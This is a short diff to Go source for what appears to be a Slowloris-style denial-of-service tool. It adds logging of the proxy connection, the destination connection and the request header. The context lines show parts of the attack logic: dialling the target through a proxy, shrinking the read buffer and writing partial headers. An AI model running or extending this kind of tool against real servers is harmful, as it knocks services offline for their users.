@@ -140,12 +140,14 @@ func dialDestination(destinationHostPort, proxyHostPort string) io.ReadWriteClos
 			log.Printf("Couldn't setup proxy to [%s]: [%s]\n", proxyHostPort, err)
 			return nil
 		}
+		log.Printf("Connected to proxy: [%s]\n", proxyHostPort)
 		conn, err = dialer.Dial("tcp", destinationHostPort)
 	}
 	if err != nil {
 		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", destinationHostPort, err)
 		return nil
 	}
+	log.Printf("Connected to destination: [%s]\n", destinationHostPort)
 
 	tcpConn := conn.(*net.TCPConn)
 	if err = tcpConn.SetReadBuffer(128); err != nil {
@@ -172,6 +174,7 @@ func dialDestination(destinationHostPort, proxyHostPort string) io.ReadWriteClos
 
 func doLoris(conn io.ReadWriteCloser, requestHeader []byte) {
 	defer conn.Close()
+	log.Printf("RequestHeader: [%s]\n", requestHeader)
 
 	if _, err := conn.Write(requestHeader); err != nil {
 		log.Printf("Cannot write requestHeader=[%v]: [%s]\n", requestHeader, err)
